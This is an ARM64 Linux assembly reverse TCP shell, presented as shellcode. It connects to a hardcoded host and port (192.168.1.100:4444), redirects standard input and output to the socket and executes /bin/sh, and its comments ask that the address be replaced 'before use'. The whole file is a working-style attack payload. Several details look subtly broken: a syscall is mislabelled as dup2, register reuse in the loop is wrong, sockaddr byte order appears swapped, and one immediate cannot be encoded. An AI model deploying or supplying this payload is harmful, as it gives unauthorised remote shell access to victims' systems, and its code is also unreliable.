; Linux ARM64 reverse TCP shell
; Connects to LHOST:LPORT and spawns /bin/sh
; Replace LHOST and LPORT bytes before use

section .text
global _start
_start:
    ; socket(AF_INET, SOCK_STREAM, 0)
    mov     x8, #198            ; __NR_socket
    mov     x0, #2              ; AF_INET
    mov     x1, #1              ; SOCK_STREAM
    mov     x2, #0
    svc     #0
    mov     x12, x0             ; save sockfd

    ; sockaddr_in: AF_INET, port 4444, 192.168.1.100
    sub     sp, sp, #16
    mov     w1, #0x115c         ; port 4444 big-endian
    movk    w1, #0x0002, lsl #16 ; AF_INET
    str     w1, [sp]
    mov     w1, #0x6401a8c0     ; 192.168.1.100 LE
    str     w1, [sp, #4]
    str     xzr, [sp, #8]

    ; connect(sockfd, &addr, 16)
    mov     x8, #203            ; __NR_connect
    mov     x0, x12
    mov     x1, sp
    mov     x2, #16
    svc     #0

    ; dup2(sockfd, 0/1/2)
    mov     x8, #24             ; __NR_dup2
    mov     x0, x12
    mov     x1, #2
.dup_loop:
    svc     #0
    subs    x1, x1, #1
    b.ge    .dup_loop

    ; execve("/bin/sh", NULL, NULL)
    mov     x8, #221
    adr     x0, binsh
    mov     x1, xzr
    mov     x2, xzr
    svc     #0
binsh: .ascii "/bin/sh\0"
